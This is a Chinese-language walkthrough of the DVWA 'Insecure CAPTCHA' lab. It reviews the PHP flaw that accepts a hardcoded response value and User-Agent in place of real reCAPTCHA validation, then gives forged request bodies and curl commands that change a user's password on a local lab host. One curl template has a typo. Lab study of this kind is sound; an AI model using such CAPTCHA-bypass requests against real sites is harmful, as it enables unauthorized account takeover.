# Insecure CAPTCHA

>Objective: Your aim, change the current user's password in an automated manner because of the poor CAPTCHA system.

### 觀察

看一下 request body
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/0ea01d5e-cde8-4806-b365-5f98f544d384/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144358Z&X-Amz-Expires=86400&X-Amz-Signature=9cae85a6b168adb247fab9e93fcb046ad0e9ee5f7b67bc981456c19c6bcf06ed&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

如果正常進行驗證的話，這個值會是從 google 的 server 取得的

```
g-recaptcha-response
```

從 source panel 中搜尋 token 就可以找到一些提示和 `user_token`

```bash
**DEV NOTE**   Response: 'hidd3n_valu3'   &&   User-Agent: 'reCAPTCHA'   **/DEV NOTE**
```

很明顯的要我們改 `User-Agent` 和另外一個意義不明的 hidd3n_valu3
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/bcb37dd2-07bf-4964-ae98-01099d355fd1/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144456Z&X-Amz-Expires=86400&X-Amz-Signature=d2990c1ac60f849388ea72eba4c4409f3beada8589c026d451d616693461f0ee&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

如果想故意繞過 re**CAPTCHA，就一定要偽造** `g-recaptcha-response` 這個值，但不透過 re**CAPTCHA 驗證不可能拿得到它，因此就可以懷疑題目是不是要我們把那個意義不明的** `hidd3n_valu3` 填入裡面，再加上還要修改 User Agent

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/5d5fed72-a4bd-4d0b-a0c3-5bbc5e6fb0bc/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144436Z&X-Amz-Expires=86400&X-Amz-Signature=ec6867c76856971f5e7c5573b042eb5841f42fe7dd9d87c07256e224a2c773a7&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Source code review

後來看了 source code 才確定真的是要將 hidd3n_valu3 放入之前觀察到的 `g-recaptcha-response` 欄位裡

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d68ff088-95cb-4421-8e09-fae13009204d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144601Z&X-Amz-Expires=86400&X-Amz-Signature=edd43885350c656a68d6261ab008dee68639e11e5645fbdfd2d6eaf755637d85&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

先看到  `recaptcha_check_answer()` 這個 function，但並沒有被放在提示裡，只能推斷裡面應該是去戳 Google 驗證 reCAPTCHA 的 API，如果是這樣的話那接下來就會進到下方的 `$_POST[ 'g-recaptcha-response' ]` 和 `$_SERVER[ 'HTTP_USER_AGENT' ]` 判斷

最明顯的缺失是這部分:

```php
if (
    $resp || 
    (
        $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
        && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
    )
){
```

有幾個缺失:

- $_POST[ 'g-recaptcha-response' ] 裡的值不是正常的 `garetapcta-response` ，而是自己設定的值
- 應該要用 `&&` 代替 `||` ，並且要使用別的方式代替後半部的 user 身份驗證 e.g email or 簡訊

> After you get the response token, you need to verify it within two minutes with reCAPTCHA using the following API to ensure the token is valid.
>

參考 Google reCAPTCHA 的[文件](https://developers.google.com/recaptcha/docs/verify)中有提到，server 要在兩分鐘內驗證 response token

因此這是一個 Server Side Validation 的缺失

### 驗證

試試看是否能成功 bypass reCAPTCHA

了解來龍去脈後，就可以開始準備材料了

`User-Agent`

```php
User-Agent: reCAPTCHA
```

`Request Body`

```php
step=1
&password_new=1111
&password_conf=1111
&g-recaptcha-response=hidd3n_valu3
&user_token=3d10f1b5d1b01e89d667aeb3b77777aa
&Change=Change
```

### Browser

先在瀏覽器直接試試看

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/81566333-f8a5-453e-b234-18b702678a91/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144635Z&X-Amz-Expires=86400&X-Amz-Signature=d2f0bf63e878aebfae1731767e2cbdf7bb0de8195bf1d5ae9078fc0022ae48d9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

要填入的欄位有三個，分別是 User Agent
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a95af2cc-9377-4aba-9e29-52b2c9a99898/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144652Z&X-Amz-Expires=86400&X-Amz-Signature=5fc87962a425110eba342df52c27e1392165205ec5a8821cb3cd854b39f05c27&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

g-recaptcha-response
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/113def55-cf7a-4ff0-9e12-4f249e5b6aad/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144711Z&X-Amz-Expires=86400&X-Amz-Signature=fb550556fbabdf32fefe5db56d2a7e75ca6d428c8dda000ec6572bf38626bac4&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

user_token
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b9d7268d-44ec-48a4-bd27-b51f1094d155/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144723Z&X-Amz-Expires=86400&X-Amz-Signature=de4696ca6751bed35716617a3bacca2f7e2d381ba36f3e4cf731910fd317dda1&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

成功修改密碼
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ef394582-87d1-42c9-911f-79f31fc2bf01/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144735Z&X-Amz-Expires=86400&X-Amz-Signature=b68d65a224bd136700dcafe6851011c2fa18b979be0561c3a5365fd4b0171590&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

來確認一下已經送出的 request

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/cd6553b5-0727-4df3-a5d5-cae8c0ebc99a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T144835Z&X-Amz-Expires=86400&X-Amz-Signature=6820cfb9e02a9e9a96afb08d271381afb838d2b04588c41f257bf2f1b542b44b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```json
{
	"step": "1",
	"password_new": "1111",
	"password_conf": "1111",
	"g-recaptcha-response": "hidd3n_valu3",
	"user_token": "1762a90d0d0524fe11725d6a5fd9ecec",
	"Change": "Change"
}
```

### curl

```bash
curl -v -L \
-c cookies.txt -b cookies.txt \
-X POST $HOST \
-H "User-Agent: ${USER_AGENT}" \
--data-raw \
"step=1&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&g-recaptcha-response=${G_RES}&user_token=${TOKEN&}Change=Change"
```

```bash
curl -v -L \
--cookie "PHPSESSID=4774b7d45d62876f2f8a2e93ba5e7640;security=high" \
-X POST http://dvwa.localtest/vulnerabilities/captcha/ \
-H "User-Agent: reCAPTCHA" \
--data-raw \
"step=1&password_new=1111&password_conf=1111&g-recaptcha-response=hidd3n_valu3&user_token=54fb2e161e4428868c54085b6764dfe3&Change=Change"
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/ff9d5f58-68ef-4a44-af4a-c0d5b55d5ee4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220221T145122Z&X-Amz-Expires=86400&X-Amz-Signature=7dbcfdbf9a78d158cd7716d3a6cbadf65e76ca6247539859049eddea644ab08a&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)
